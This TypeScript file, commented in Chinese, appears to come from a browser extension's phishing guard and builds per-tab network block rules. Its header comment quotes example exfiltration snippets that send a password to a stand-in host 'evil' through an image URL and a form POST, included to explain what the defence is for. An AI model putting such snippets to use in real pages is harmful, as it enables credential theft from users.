/**
 * 钓鱼防护的 declarativeNetRequest 规则形状（纯数据，可在单测里直接断言）。
 *
 * 为什么需要它：`content/guard/main.ts` 里替换 `fetch`/`XHR`/`WebSocket` 只是**页面 JS 层**的拦截。
 * 仿冒站完全绕开这些 API 继续外传数据：`new Image().src = 'https://evil/?q=' + password`、
 * `navigator.sendBeacon`、`<form action="https://evil/collect" method="POST">`、
 * 甚至一个跨域 iframe 里的原生 `fetch`。扩展的网络层（DNR）在请求进入网络栈之前就拦下，
 * 才是真正「发不出去」。
 *
 * 为什么按**标签页**（`tabIds`）而不是按域名：
 * - 判据是「主机名包含品牌词」这种模式，DNR 的域名匹配表达不了（只能静态枚举域名，
 *   而仿冒站域名每天都在换）；
 * - `tabIds` 覆盖该标签页里**一切**发起方——包括跨域 iframe、Worker、表单、图片，
 *   这些请求的 initiator 各不相同，按域名匹配会漏；
 * - `tabIds` 只支持 session 规则，而 session 规则本来就是我们想要的语义（浏览器退出即清空，
 *   不会把封锁状态持久化到下一次启动）。
 */
export interface GuardRule {
    id: number
    priority: number
    action: chrome.declarativeNetRequest.RuleAction
    condition: chrome.declarativeNetRequest.RuleCondition
}

/** 后台对一次页面同步的结论（页面据此决定「画警告」还是「悄悄恢复」） */
export type GuardMode = 'armed' | 'released' | 'none'

/**
 * 为某个标签页生成封锁规则。
 *
 * `id` 直接用 tabId：一个标签页最多一条规则，天然唯一；`updateSessionRules` 按 id
 * 覆盖/删除，因此重复下发是幂等的。
 *
 * **只排除 `main_frame`**：
 * - 必须排除——否则用户连地址栏跳转、点「继续访问」后的刷新都会被拦（顶层导航的
 *   initiator 也可能是本页），只能靠关标签页离开；
 * - 其余全部拦截（`excludedResourceTypes` 只写 main_frame，等于其余类型全封）。
 *   文档默认值虽然也是「除 main_frame 之外全部」，但显式写出来才能防止后来者
 *   「补上 resourceTypes」时把拦截面缩小。
 */
export function guardRuleForTab(tabId: number): GuardRule {
    return {
        id: tabId,
        priority: 1,
        action: { type: 'block' },
        condition: {
            tabIds: [tabId],
            excludedResourceTypes: ['main_frame']
        }
    }
}
